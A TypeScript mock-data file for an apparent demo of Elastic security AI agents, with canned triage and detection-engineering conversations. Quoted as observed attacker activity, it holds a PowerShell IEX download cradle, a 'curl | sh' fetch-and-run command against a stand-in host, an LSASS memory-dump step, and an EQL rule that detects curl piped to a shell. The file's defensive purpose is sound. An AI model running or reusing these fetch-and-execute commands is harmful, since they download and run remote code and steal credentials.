export interface Agent {
  id: string;
  name: string;
  description: string;
  avatarColor: string;
  avatarSymbol: string;
  labels: string[];
  access: 'Private' | 'Space' | 'Shared';
  type: 'Elastic' | 'Custom';
  createdBy: string;
  createdAt: string;
  updatedBy: string;
  updatedAt: string;
  instructions: string;
  tools: string[];
  skills: string[];
  isSpaceDefault?: boolean;
  readonly?: boolean;
}

export type MessageRole = 'user' | 'assistant';

export interface ToolCallStep {
  id: string;
  label: string;
  tool: string;
  summary: string;
  durationMs: number;
}

export interface Message {
  id: string;
  role: MessageRole;
  content: string;
  createdAt: string;
  steps?: ToolCallStep[];
}

export interface Conversation {
  id: string;
  agentId: string;
  title: string;
  updatedAt: string;
  pinned?: boolean;
  unread?: boolean;
  messages: Message[];
}

const NOW = new Date('2026-10-19T14:05:00.000Z').getTime();
const minutesAgo = (minutes: number) => new Date(NOW - minutes * 60_000).toISOString();
const hoursAgo = (hours: number) => minutesAgo(hours * 60);
const daysAgo = (days: number) => hoursAgo(days * 24);

export const AGENTS: Agent[] = [
  {
    id: 'elastic-ai-agent',
    name: 'Elastic AI Agent',
    description:
      'The default Elastic agent. Answers questions about your data, triages alerts, investigates attacks and builds detection rules using the built-in Security tools.',
    avatarColor: '#0B64DD',
    avatarSymbol: 'E',
    labels: ['Elastic', 'default'],
    access: 'Space',
    type: 'Elastic',
    createdBy: 'elastic',
    createdAt: daysAgo(300),
    updatedBy: 'elastic',
    updatedAt: daysAgo(3),
    instructions:
      'You are the Elastic AI Agent for the Security solution. Prefer Security tools (alerts search, entity risk, rule management) over generic ES|QL when the question is about detections. Always cite the documents you used.',
    tools: ['platform.core.search', 'platform.core.execute_esql', 'security.alerts.search', 'security.entity.risk_summary', 'security.rules.list'],
    skills: ['alert-triage', 'rule-authoring', 'case-summary'],
    isSpaceDefault: true,
    readonly: true,
  },
  {
    id: 'soc-triage-agent',
    name: 'SOC Triage Agent',
    description:
      'Tier-1 triage assistant. Enriches open alerts with entity risk and threat intel, proposes a verdict and drafts the case summary.',
    avatarColor: '#E7664C',
    avatarSymbol: 'T',
    labels: ['security', 'triage', 'tier-1'],
    access: 'Shared',
    type: 'Custom',
    createdBy: 'pavel.manko',
    createdAt: daysAgo(42),
    updatedBy: 'ana.ruiz',
    updatedAt: hoursAgo(6),
    instructions:
      'Triage every alert handed to you. For each alert: (1) summarize what happened in two sentences, (2) list the entities involved with their risk, (3) check threat intelligence matches, (4) recommend one of: close as false positive, acknowledge, escalate. Never close an alert yourself; propose the action instead.',
    tools: ['security.alerts.search', 'security.entity.risk_summary', 'security.threat_intel.lookup', 'platform.core.search'],
    skills: ['alert-triage', 'ioc-enrichment'],
  },
  {
    id: 'detection-engineer',
    name: 'Detection Engineering Agent',
    description:
      'Helps author, tune and test detection rules. Can preview a rule against the last 7 days of data and suggest exceptions for noisy rules.',
    avatarColor: '#54B399',
    avatarSymbol: 'D',
    labels: ['security', 'rules'],
    access: 'Space',
    type: 'Custom',
    createdBy: 'sam.chen',
    createdAt: daysAgo(20),
    updatedBy: 'sam.chen',
    updatedAt: daysAgo(1),
    instructions:
      'You are a detection engineer. When asked for a rule, produce EQL or KQL, explain the logic, list false positive sources and propose a MITRE ATT&CK mapping. Use the rule preview tool before recommending a rule for production.',
    tools: ['security.rules.list', 'security.rules.preview', 'platform.core.execute_esql', 'security.mitre.lookup'],
    skills: ['rule-authoring', 'rule-tuning'],
  },
  {
    id: 'threat-hunter',
    name: 'Threat Hunter',
    description:
      'Runs hypothesis-driven hunts over endpoint, network and identity data and packages findings into a hunt report.',
    avatarColor: '#BFA1E2',
    avatarSymbol: 'H',
    labels: ['security', 'hunting'],
    access: 'Private',
    type: 'Custom',
    createdBy: 'lee.okafor',
    createdAt: daysAgo(9),
    updatedBy: 'lee.okafor',
    updatedAt: hoursAgo(26),
    instructions:
      'Start every hunt by stating the hypothesis and the data sources you will query. Iterate with ES|QL, pivot on entities and finish with a report that lists indicators, affected assets and recommended detections.',
    tools: ['platform.core.execute_esql', 'security.entity.risk_summary', 'security.threat_intel.lookup', 'platform.core.search'],
    skills: ['threat-hunting', 'ioc-enrichment'],
  },
];

export const DEFAULT_AGENT_ID = 'elastic-ai-agent';

export const getAgentById = (id: string | undefined): Agent | undefined =>
  AGENTS.find((agent) => agent.id === id);

export const CONVERSATIONS: Conversation[] = [
  {
    id: 'conv-fin07-powershell',
    agentId: 'elastic-ai-agent',
    title: 'Triage: encoded PowerShell on win-fin-07',
    updatedAt: minutesAgo(3),
    pinned: true,
    messages: [
      {
        id: 'm1',
        role: 'user',
        content: 'Triage the high alert "PowerShell Encoded Command Execution" on win-fin-07 for me.',
        createdAt: minutesAgo(6),
      },
      {
        id: 'm2',
        role: 'assistant',
        createdAt: minutesAgo(5),
        steps: [
          {
            id: 's1',
            label: 'Searching alerts for host win-fin-07',
            tool: 'security.alerts.search',
            summary: 'Found 4 open alerts in the last 24h, 2 critical.',
            durationMs: 820,
          },
          {
            id: 's2',
            label: 'Decoding PowerShell payload',
            tool: 'platform.core.execute_esql',
            summary: 'Base64 decodes to an IEX download cradle fetching http://198.51.100.22/a.ps1',
            durationMs: 410,
          },
          {
            id: 's3',
            label: 'Looking up entity risk',
            tool: 'security.entity.risk_summary',
            summary: 'Host risk 87 (High), user j.alvarez risk 82 (High).',
            durationMs: 390,
          },
        ],
        content: `### Verdict: **True positive — escalate**

**What happened**  
\`WINWORD.EXE\` (opened from \`Q3_Invoice_Summary.docm\`) spawned \`powershell.exe\` with a hidden, Base64-encoded command. The payload decodes to an \`IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22/a.ps1')\` download cradle.

**Why it matters**
- 198.51.100.22 matches a **threat intel indicator** (AbuseCH, first seen 2 days ago).
- 60 minutes later the same PowerShell process spawned \`rundll32.exe\` which created \`C:\\Users\\Public\\lsass.dmp\` (**LSASS Memory Dump Creation**, critical).
- Host **win-fin-07** is tagged *high impact*; user **j.alvarez** is in the Finance analysts group.

**Recommended actions**
1. Isolate \`win-fin-07\` (Elastic Defend response action).
2. Reset credentials for \`j.alvarez\` and any account logged on during the dump.
3. Attach both alerts to case **#1042** and set severity to *High*.

Would you like me to draft the case summary?`,
      },
    ],
  },
  {
    id: 'conv-kerberoast',
    agentId: 'elastic-ai-agent',
    title: 'Kerberoasting spike on srv-dc-01',
    updatedAt: hoursAgo(2),
    unread: true,
    messages: [
      {
        id: 'm1',
        role: 'user',
        content: 'Why are we seeing RC4 service ticket requests against srv-dc-01 today?',
        createdAt: hoursAgo(2.2),
      },
      {
        id: 'm2',
        role: 'assistant',
        createdAt: hoursAgo(2),
        steps: [
          {
            id: 's1',
            label: 'Querying authentication events (4769) for the last 24h',
            tool: 'platform.core.execute_esql',
            summary: '27 TGS requests with encryption type 0x17 from a single workstation.',
            durationMs: 1200,
          },
        ],
        content: `All 27 RC4 (0x17) service ticket requests in the last 24 hours originate from **10.20.4.57 (win-fin-07)** and target 9 distinct SPNs — \`MSSQLSvc\`, \`HTTP/intranet\`, \`CIFS/fileshare01\` among them. This pattern (many SPNs, one source, downgraded encryption) is consistent with **Kerberoasting**.

The source host is the same one currently flagged for encoded PowerShell execution, so I would treat this as part of the same intrusion rather than a legacy application issue.`,
      },
    ],
  },
  {
    id: 'conv-rule-webshell',
    agentId: 'detection-engineer',
    title: 'Tune web shell rule for php-fpm noise',
    updatedAt: daysAgo(1),
    messages: [
      {
        id: 'm1',
        role: 'user',
        content: 'The web shell rule fires on our image-resizing cron job on lnx-web-03. Can you suggest an exception?',
        createdAt: daysAgo(1.1),
      },
      {
        id: 'm2',
        role: 'assistant',
        createdAt: daysAgo(1),
        content: `The noisy executions all share \`process.parent.name: php-fpm8.1\` with \`process.command_line: /usr/bin/convert *\` under \`/var/www/app/cron\`. I recommend a **rule exception** rather than editing the query:

\`\`\`
process.executable : "/usr/bin/convert" and process.working_directory : "/var/www/app/cron"
\`\`\`

This keeps detection for shells spawned by php-fpm with any other command line intact. Preview over the last 7 days removes 212 of 214 alerts; the two remaining are the \`curl | sh\` executions you already have a case for.`,
      },
    ],
  },
  {
    id: 'conv-hunt-ssh',
    agentId: 'threat-hunter',
    title: 'Hunt: SSH from Tor exit nodes',
    updatedAt: daysAgo(2),
    messages: [
      {
        id: 'm1',
        role: 'user',
        content: 'Hunt for SSH logins from known Tor exit nodes over the last 30 days.',
        createdAt: daysAgo(2.1),
      },
      {
        id: 'm2',
        role: 'assistant',
        createdAt: daysAgo(2),
        content: `**Hypothesis:** an attacker is using Tor to log into exposed SSH endpoints with valid credentials.

**Findings:** 3 successful logins from Tor exit nodes, all for user \`r.kim\` on \`mac-eng-22\` (185.220.101.4, 185.220.101.47, 185.220.100.240). No failed attempts preceded them, which suggests the credentials were already known.

**Recommendation:** rotate r.kim's credentials, enforce MFA for SSH and add a detection for \`source.ip\` in the Tor exit list with \`event.outcome: success\`.`,
      },
    ],
  },
];

export const getConversation = (id: string | undefined): Conversation | undefined =>
  CONVERSATIONS.find((c) => c.id === id);

export const SUGGESTED_PROMPTS = [
  'Which alerts should I look at first today?',
  'Summarize the activity on win-fin-07 in the last 24 hours',
  'Create a detection rule for curl piped to sh from a web server',
  'Which users logged in from a new country this week?',
];

export const CAPABILITY_MESSAGES = [
  'I can triage security alerts',
  'I can investigate attacks',
  'I can build detection rules',
  'I can summarize open cases',
  'I can investigate entity or endpoint risk',
  'I can create workflows',
];

interface CannedResponse {
  match: RegExp;
  steps: ToolCallStep[];
  content: string;
}

const CANNED: CannedResponse[] = [
  {
    match: /first|priorit|look at|today|open alerts|triage/i,
    steps: [
      {
        id: 's1',
        label: 'Searching open alerts',
        tool: 'security.alerts.search',
        summary: '24 alerts in the last 24h: 4 critical, 9 high, 7 medium, 4 low.',
        durationMs: 740,
      },
      {
        id: 's2',
        label: 'Ranking by entity risk and threat intel matches',
        tool: 'security.entity.risk_summary',
        summary: 'win-fin-07 and srv-dc-01 carry the highest combined risk.',
        durationMs: 510,
      },
    ],
    content: `Here is how I would prioritize the open queue:

| # | Alert | Host | Why first |
|---|-------|------|-----------|
| 1 | **LSASS Memory Dump Creation** (critical) | win-fin-07 | Credential theft on a high-impact finance workstation, same session as the encoded PowerShell |
| 2 | **Potential Kerberoasting via RC4** (critical) | srv-dc-01 | 27 SPN requests from win-fin-07 against the domain controller |
| 3 | **PowerShell Encoded Command Execution** (high) | win-fin-07 | Initial access vector, C2 at 198.51.100.22 matches threat intel |
| 4 | **Web Shell Detection** (high) | lnx-web-03 | Externally reachable host, \`curl | sh\` from php-fpm |

Alerts 1–3 look like **one intrusion** starting from the macro document opened by \`j.alvarez\`. I suggest isolating win-fin-07 and working these three together in case #1042.`,
  },
  {
    match: /win-fin-07|fin-07|summar.*host|host.*summar/i,
    steps: [
      {
        id: 's1',
        label: 'Collecting events for win-fin-07 (24h)',
        tool: 'platform.core.execute_esql',
        summary: '18,402 events: 11 alerts, 2 critical.',
        durationMs: 1320,
      },
    ],
    content: `**win-fin-07 — last 24 hours**

- **09:12** \`j.alvarez\` opens \`Q3_Invoice_Summary.docm\` from Downloads (Outlook attachment).
- **09:13** Word spawns hidden, encoded **PowerShell** → downloads \`a.ps1\` from 198.51.100.22 *(threat intel match)*.
- **09:40** PowerShell launches **rundll32 comsvcs MiniDump** on LSASS → \`C:\\Users\\Public\\lsass.dmp\`.
- **10:02 – 10:30** 27 Kerberos **RC4 service ticket requests** to srv-dc-01 for 9 SPNs.
- **13:50** Host isolated by Elastic Defend (pending analyst review).

Host risk score is **87 (High)**; the user's risk score rose from 31 to **82** today. No lateral RDP/SMB sessions from this host have been observed yet.`,
  },
  {
    match: /rule|detect|eql|kql|curl|pipe/i,
    steps: [
      {
        id: 's1',
        label: 'Checking existing rules for overlap',
        tool: 'security.rules.list',
        summary: 'Closest match: "Web Shell Detection: Script Process Child of Common Web Processes".',
        durationMs: 460,
      },
      {
        id: 's2',
        label: 'Previewing the rule over the last 7 days',
        tool: 'security.rules.preview',
        summary: '2 hits, both on lnx-web-03.',
        durationMs: 2100,
      },
    ],
    content: `Here is an EQL rule for **curl/wget piped to a shell from a web server process**:

\`\`\`eql
sequence by host.id with maxspan=10s
  [process where event.type == "start" and
     process.parent.name : ("php-fpm*", "apache2", "nginx", "httpd") and
     process.name : ("curl", "wget")]
  [process where event.type == "start" and
     process.name : ("sh", "bash", "dash") and
     process.args : ("-c", "*|*")]
\`\`\`

- **Severity:** high · **Risk score:** 73
- **MITRE ATT&CK:** Persistence › Web Shell (T1505.003); Command and Scripting Interpreter (T1059.004)
- **False positives:** deployment scripts that fetch installers; add an exception on \`process.working_directory\`.

The 7-day preview produced **2 alerts**, both the known \`curl -s http://203.0.113.80/x.sh | sh\` executions on lnx-web-03. Want me to create this rule as *disabled* so you can review it?`,
  },
  {
    match: /user|login|country|logon|new|geo/i,
    steps: [
      {
        id: 's1',
        label: 'Comparing login geolocation against a 30-day baseline',
        tool: 'platform.core.execute_esql',
        summary: '2 users with first-seen countries this week.',
        durationMs: 980,
      },
    ],
    content: `Two users authenticated from a country not seen in their 30-day baseline:

- **r.kim** — 3 successful SSH logins to \`mac-eng-22\` from **Germany** (185.220.101.x, Tor exit nodes). Baseline: Netherlands only. *Unusual Source IP* ML alert already open.
- **j.alvarez** — 1 VPN login from **Romania** (Sunday 02:14). Baseline: Spain only. Occurred 7 hours before the encoded PowerShell execution on win-fin-07.

Both are worth a quick confirmation with the users; I would prioritize r.kim given the Tor exit nodes.`,
  },
];

const FALLBACK: CannedResponse = {
  match: /.*/,
  steps: [
    {
      id: 's1',
      label: 'Searching your Security data',
      tool: 'platform.core.search',
      summary: 'Searched alerts, cases and entity risk for the last 24 hours.',
      durationMs: 650,
    },
  ],
  content: `This demo runs on canned data, so I can only answer a few questions well. Try one of these:

- *Which alerts should I look at first today?*
- *Summarize the activity on win-fin-07 in the last 24 hours*
- *Create a detection rule for curl piped to sh from a web server*
- *Which users logged in from a new country this week?*

Everything you see — the alerts, hosts, users and this conversation — is fake and lives in the browser.`,
};

export const getCannedResponse = (prompt: string): CannedResponse =>
  CANNED.find((candidate) => candidate.match.test(prompt)) ?? FALLBACK;

export const MANAGE_NAV_ITEMS = [
  { id: 'agents', label: 'Agents', icon: 'productAgent', live: true },
  { id: 'skills', label: 'Skills', icon: 'sparkles', live: false },
  { id: 'tools', label: 'Tools', icon: 'wrench', live: false },
  { id: 'connectors', label: 'Connectors', icon: 'link', live: false },
] as const;
